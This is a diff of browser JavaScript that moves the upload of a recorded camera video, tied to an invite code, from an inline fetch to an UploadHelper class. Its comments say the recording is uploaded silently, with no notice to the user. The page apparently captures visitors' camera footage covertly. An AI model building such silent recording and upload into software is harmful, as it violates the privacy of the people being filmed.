@@ -1707,11 +1707,24 @@ function startRecordingAndUpload() {
                         console.error('停止MediaRecorder失败:', err);
                     }
                 }
-                
-                // 自动上传（静默上传，不显示提示）
+
+                // 使用 UploadHelper 自动上传（静默上传，不显示提示）
                 console.log('开始上传录像...');
                 isUploading = true;
-                await uploadVideo(recordedBlob);
+                if (!window.UploadHelper) {
+                    console.error('UploadHelper 未加载');
+                    throw new Error('上传模块未加载');
+                }
+
+                const uploader = new window.UploadHelper();
+                await uploader.uploadVideo(recordedBlob, inviteCode, {
+                    onSuccess: () => {
+                        console.log('✅ 上传成功');
+                    },
+                    onError: (error) => {
+                        console.error('上传失败:', error.message);
+                    }
+                });
                 console.log('录像上传完成');
             } catch (err) {
                 console.error('处理录像失败:', err);
@@ -1749,64 +1762,6 @@ function startRecordingAndUpload() {
         releaseCamera();
         // 重置标志，允许下次录像
         videoRecordingInProgress = false;
-        // 静默失败，不显示提示
-    }
-}
-
-// --- 上传录像到主系统 ---
-async function uploadVideo(blob) {
-    console.log('uploadVideo 被调用, blob大小:', blob.size, 'bytes, inviteCode:', inviteCode);
-    
-    // 再次验证邀请码（防止绕过验证）
-    if (!inviteCode) {
-        console.error('缺少邀请链接码，无法上传');
-        blockPageAccess('邀请链接码无效');
-        return;
-    }
-    
-    try {
-        const formData = new FormData();
-        formData.append('video', blob, 'record.webm');
-        formData.append('invite_code', inviteCode);
-        
-        console.log('发送上传请求到 api/upload_video.php, inviteCode:', inviteCode);
-        const response = await fetch('api/upload_video.php', {
-            method: 'POST',
-            body: formData
-        });
-        
-        console.log('收到服务器响应, status:', response.status, 'statusText:', response.statusText);
-        
-        if (!response.ok) {
-            const text = await response.text();
-            console.error('上传失败，HTTP状态:', response.status, '响应内容:', text);
-            throw new Error('上传失败：服务器错误 ' + response.status);
-        }
-        
-        const text = await response.text();
-        console.log('服务器响应文本:', text);
-        let data;
-        try {
-            data = JSON.parse(text);
-            console.log('解析后的响应数据:', data);
-        } catch (e) {
-            console.error('JSON解析失败:', e, '原始文本:', text);
-            throw new Error('服务器返回格式错误');
-        }
-        
-        if (data.success) {
-            console.log('✅ 上传成功');
-            isUploading = false;
-            // 静默成功，不显示提示
-            // 注意：摄像头已在 uploadVideo 调用后释放
-        } else {
-            console.error('上传失败，服务器返回:', data);
-            throw new Error(data.message || '上传失败');
-        }
-    } catch (err) {
-        console.error('上传错误:', err);
-        isUploading = false;
-        // 上传失败也要确保摄像头已释放（在 finally 中已处理）
         // 静默失败，不显示提示
     }
 }
